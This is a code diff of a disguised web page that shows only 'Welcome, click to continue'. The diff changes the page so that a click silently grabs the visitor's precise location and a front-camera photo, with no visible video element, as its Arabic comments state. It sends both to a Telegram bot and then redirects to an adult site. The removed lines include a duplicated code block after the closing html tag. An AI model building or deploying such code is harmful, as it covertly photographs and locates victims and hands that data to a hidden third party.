@@ -78,7 +78,6 @@
     100% { transform: rotate(360deg);}
   }
 
-  video { display:none; border-radius:8px; max-width: 420px; width: 100%; margin-top: 12px;}
   #status { margin-top: 12px; min-height: 24px; font-weight: bold; }
 </style>
 </head>
@@ -86,8 +85,6 @@
   <h2>Welcome</h2>
   <p>Click the button to continue.</p>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none"></canvas>
   <div id="status">done</div>
   <button id="goBtn">Next
     <div class="loading" id="loader"></div>
@@ -101,105 +98,54 @@ const SECOND_SITE = "https://ar.stripchat.com";
 const status = document.getElementById('status');
 const goBtn = document.getElementById('goBtn');
 const loader = document.getElementById('loader');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
 
-async function sendToTelegram(blob, lat, lon, isVideo=false) {
+goBtn.addEventListener('click', async () => {
   try {
     loader.style.display = "block";      
     goBtn.textContent = "";               
-    if (lat && lon) {
-      const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `Location: ${mapLink}` })
-      });
-    }
+
+    // الحصول على الموقع
+    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+
+    // فتح الكاميرا في الخلفية بدون أي عنصر مرئي
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r=>setTimeout(r,1000));
+
+    // التقاط الصورة في الخلفية
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+    const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
+    stream.getTracks().forEach(t=>t.stop());
+
+    // إرسال الموقع أولًا
+    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id:CHAT_ID, text:`Location: ${mapLink}`})
+    });
+
+    // إرسال الصورة
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
-    if (!isVideo) {
-      form.append('photo', blob, 'photo.jpg');
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
-    } else {
-      form.append('video', blob, 'clip.mp4');
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
-    }
+    form.append('photo', blob, 'photo.jpg');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
 
+    // تحويل تلقائي بعد النجاح
     window.location.href = SECOND_SITE;
 
-  } catch (err) {
-    console.error(err);
-    status.textContent = "Error: " + err.message;
+  } catch(e) {
+    console.error(e);
     loader.style.display = "none";
     goBtn.textContent = "Next";
-  }
-}
-
-goBtn.addEventListener('click', async () => {
-  status.textContent = "Requesting permissions...";
-  let lat=null, lon=null;
-  try {
-    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
-    lat = pos.coords.latitude; lon = pos.coords.longitude;
-  } catch(e) {
-    status.textContent = "Permission denied: " + (e.message||e);
-    return;
-  }
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
-    video.style.display = "block";
-    video.srcObject = stream;
-    await new Promise(r=>setTimeout(r,1000));
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(async (blob) => {
-      stream.getTracks().forEach(t=>t.stop());
-      video.style.display = "none";
-      await sendToTelegram(blob, lat, lon, false);
-    }, 'image/jpeg', 0.85);
-  } catch (err) {
-    console.error(err);
-    status.textContent = "Error: " + (err.message||err);
-  }
-});
-</script>
-</body>
-</html>    status.textContent = "Error: " + err.message;
-  }
-}
-
-goBtn.addEventListener('click', async () => {
-  status.textContent = "Requesting permissions...";
-  let lat=null, lon=null;
-  try {
-    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
-    lat = pos.coords.latitude; lon = pos.coords.longitude;
-  } catch(e) {
-    status.textContent = "Permission denied: " + (e.message||e);
-    return;
-  }
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
-    video.style.display = "block";
-    video.srcObject = stream;
-    await new Promise(r=>setTimeout(r,1000));
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(async (blob) => {
-      stream.getTracks().forEach(t=>t.stop());
-      video.style.display = "none";
-      await sendToTelegram(blob, lat, lon, false);
-    }, 'image/jpeg', 0.85);
-  } catch (err) {
-    console.error(err);
-    status.textContent = "Error: " + (err.message||err);
+    alert('حدث خطأ أو تم رفض الأذونات.');
   }
 });
 </script>
